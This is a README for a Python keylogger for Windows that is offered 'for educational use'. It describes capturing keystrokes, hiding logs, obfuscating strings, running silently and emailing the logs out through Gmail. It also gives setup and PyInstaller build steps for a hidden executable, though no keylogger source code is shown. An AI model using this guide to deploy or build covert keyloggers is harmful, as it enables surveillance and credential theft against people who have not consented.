# 🔑 Python Keylogger for Windows (Educational Use Only)

<div align="center">

[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://windows.microsoft.com)
[![Gmail](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white)](https://gmail.com)

![Keylogger Demo](https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/giphy.gif)

</div>

> ⚠️ **CRITICAL WARNING**: This project is for **EDUCATIONAL USE ONLY** and must **never** be used without explicit, informed consent of all users of the target machine. Unauthorized use is **illegal** and may lead to **criminal prosecution**. Please use responsibly and ethically.

## 📖 Overview

This repository contains a **simple Python-based keylogger for Windows** that demonstrates cybersecurity concepts through practical implementation:

- 🎯 **Captures keystrokes** from the target system
- 💾 **Logs data** to a hidden temporary file  
- 📧 **Emails logs** periodically using Gmail SMTP
- 🔐 **Teaches concepts** like keyboard event listening, file handling, and secure email transmission

## ✨ Features

<table>
<tr>
<td width="50%">

### 🎯 Core Functionality
- ⌨️ **Keystroke Logging**: Captures all system keystrokes
- 📂 **Hidden Storage**: Stores logs in random temp directories
- 📧 **Email Transmission**: Sends logs via Gmail SMTP server
- 🕵️ **Script Obfuscation**: Uses base64 string encoding
- 👻 **Silent Operation**: Runs without visible console window

</td>
<td width="50%">

### 🛡️ Security Features
- 🔐 **Gmail App Password**: Secure authentication method
- 📁 **Temporary Files**: Self-cleaning log storage
- 🎭 **Process Hiding**: Minimal system footprint
- ⏰ **Timed Intervals**: Configurable email frequency
- 🔧 **Customizable**: Modular design for learning

</td>
</tr>
</table>

## 🚀 Quick Start

### Prerequisites

Required software
✅ Python 3.x for Windows
✅ pip package manager



### Installation

Install required dependencies

```
pip install pynput

```
Optional: For executable conversion

```
pip install pyinstaller

```


## 🔐 Gmail Configuration

<div align="center">

![Gmail Setup](https://media.giphy.com/media/l0HlDDyxBfSaPpU88/giphy.gif)

</div>

### Step-by-Step Setup

1. **🔗 Navigate** to your [Google Account Security](https://myaccount.google.com/security) page
2. **🔒 Enable** 2-Step Verification (if not already active)
3. **📱 Access** the App Passwords section
4. **📧 Select** "Mail" as app and "Windows Computer" as device
5. **🔑 Generate** and copy the 16-character app password
6. **⚠️ Secure** your password (never share publicly!)

> 🔒 **Security Note**: Never share or publish your app password!

## ⚙️ Configuration

Edit the following variables in `keylogger.py`:

| 🏷️ Variable | 📝 Description | 🔧 Example |
|-------------|----------------|------------|
| `sender` | Your Gmail address | `your.email@gmail.com` |
| `receiver` | Destination email for logs | `logs@example.com` |
| `auth` | Gmail app password | `abcd efgh ijkl mnop` |

## 💻 Usage Guide

### 🐍 Running Python Script
```
python keylogger.py

```


**Features:**
- ⏱️ Sends logs every ~8 minutes (default)
- 👤 Runs silently in background
- 🔄 To stop: Terminate Python process in Task Manager

### 📦 Building Executable\

```
pyinstaller --onefile --windowed keylogger.py

```



**Output:**
- 📁 Executable created in `dist/` folder
- 🖱️ Double-click to run silently
- ⚠️ **Note**: Antivirus may flag as malicious

## 🔧 Customization Options

<details>
<summary>📊 <strong>Modify Email Intervals</strong></summary>

Change from default ~8 minutes to 5 minutes
time.sleep(300) # 300 seconds = 5 minutes

Or 1 hour
time.sleep(3600) # 3600 seconds = 1 hour



</details>

<details>
<summary>📁 <strong>Adjust Log File Location</strong></summary>

Modify file path for advanced stealth
(Educational purposes only)
log_file = os.path.join(custom_path, "logs.txt")



</details>

## ⚖️ Legal & Ethical Guidelines

<div align="center">

![Ethics](https://media.giphy.com/media/l3q2K5jinAlChoCLS/giphy.gif)

</div>

### 🚫 Prohibited Uses
- ❌ **Unauthorized surveillance** of any kind
- ❌ **Commercial exploitation** or malicious deployment  
- ❌ **Privacy violations** without explicit consent
- ❌ **Corporate espionage** or data theft

### ✅ Permitted Uses
- ✅ **Educational research** and cybersecurity learning
- ✅ **Personal computers** you own
- ✅ **Authorized penetration testing** with written consent
- ✅ **Academic coursework** and security demonstrations

### ⚖️ Legal Consequences
Unauthorized use may result in:
- 🏛️ **Criminal prosecution** under computer misuse laws
- 💰 **Civil penalties** and financial damages
- 📋 **Administrative sanctions** in workplace/academic settings

## 🤝 Contributing

Contributions are welcome for educational improvements! Please ensure all contributions maintain the educational focus and ethical guidelines.

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/educational-enhancement`)
3. Commit your changes (`git commit -am 'Add educational feature'`)
4. Push to the branch (`git push origin feature/educational-enhancement`)
5. Open a Pull Request

## 📋 Disclaimer

<div align="center">

> **🎓 Educational Purpose Statement**
> 
> This project is strictly for **educational and ethical research purposes**. The author accepts **no responsibility** for any damage or legal consequences resulting from misuse of this software.
> 
> By using or modifying this project, you accept **full responsibility** for compliance with all applicable laws and regulations.

</div>

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

<div align="center">

**Made with ❤️ for Cybersecurity Education**

[![Star this repo](https://img.shields.io/github/stars/Dawn-Fighter/Keylogger?style=social)](https://github.com/Dawn-Fighter/Keylogger)
[![Follow](https://img.shields.io/github/followers/Dawn-Fighter?style=social)](https://github.com/Dawn-Fighter)

</div>
